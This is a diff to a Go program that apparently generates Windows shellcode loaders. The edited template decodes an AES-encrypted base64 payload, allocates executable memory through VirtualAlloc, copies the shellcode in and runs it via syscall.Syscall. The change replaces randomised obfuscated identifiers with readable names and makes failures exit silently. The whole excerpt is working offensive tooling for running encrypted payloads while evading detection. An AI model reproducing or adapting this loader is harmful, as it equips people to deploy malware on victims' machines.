@@ -50,52 +50,49 @@ import (
 	"crypto/aes"
 	"crypto/cipher"
 	"encoding/base64"
-	"fmt"
 	"os"
 	"syscall"
 	"unsafe"
 )
 
+// Bitmasks.
 const (
-	ImLoXsgyZHyI = 0x1000
-	egxsUNd      = 0x2000
-	wOgdemlqWBGV = 0x40
+	MEMCOMMIT            = 0x1000
+	MEMRESERVE           = 0x2000
+	PAGEEXECUTEREADWRITE = 0x40
 )
 
 var (
-	WWkBCl = syscall.NewLazyDLL("kernel32.dll")
-	vnEYvT = WWkBCl.NewProc("VirtualAlloc")
+	kernel32     = syscall.NewLazyDLL("kernel32.dll")
+	virtualAlloc = kernel32.NewProc("VirtualAlloc")
 )
 
-func ueKHhjz(riZzjxfWFmxj uintptr) (uintptr, error) {
-	kMojJzioOMRujW, _, dNeEZFofBrnbj := vnEYvT.Call(0, riZzjxfWFmxj, egxsUNd|ImLoXsgyZHyI, wOgdemlqWBGV)
-	if kMojJzioOMRujW == 0 {
-		return 0, dNeEZFofBrnbj
+func alloc(size uintptr) (uintptr, error) {
+	ptr, _, err := virtualAlloc.Call(0, size, MEMRESERVE|MEMCOMMIT, PAGEEXECUTEREADWRITE)
+	if ptr == 0 {
+		return 0, err
 	}
-	return kMojJzioOMRujW, nil
+	return ptr, nil
 }
-func main() {
 
+func main() {
 	ciphertext, _ := base64.StdEncoding.DecodeString("{{.Ciphertext}}")
 	key, _ := base64.StdEncoding.DecodeString("{{.Key}}")
 	block, _ := aes.NewCipher(key)
 	plaintext := make([]byte, len(ciphertext))
 	stream := cipher.NewCTR(block, key[aes.BlockSize:])
 	stream.XORKeyStream(plaintext, ciphertext)
-	// shellcode exec
-	kMojJzioOMRujW, dNeEZFofBrnbj := ueKHhjz(uintptr(len(plaintext)))
-	if dNeEZFofBrnbj != nil {
-		fmt.Println(dNeEZFofBrnbj)
-		os.Exit(1)
+	ptr, err := alloc(uintptr(len(plaintext)))
+	if err != nil {
+		os.Exit(0)
 	}
-	ufirXzjJzKNkMJW := (*[890000]byte)(unsafe.Pointer(kMojJzioOMRujW))
-	for x, ruhMhpnDGaV := range []byte(plaintext) {
-		ufirXzjJzKNkMJW[x] = ruhMhpnDGaV
+	buff := (*[890000]byte)(unsafe.Pointer(ptr))
+	for x, y := range []byte(plaintext) {
+		buff[x] = y
 	}
-	syscall.Syscall(kMojJzioOMRujW, 0, 0, 0, 0)
+	syscall.Syscall(ptr, 0, 0, 0, 0)
 }
 `
-
 	file := flag.String("file", "", "file containing your payload")
 	flag.Parse()
 
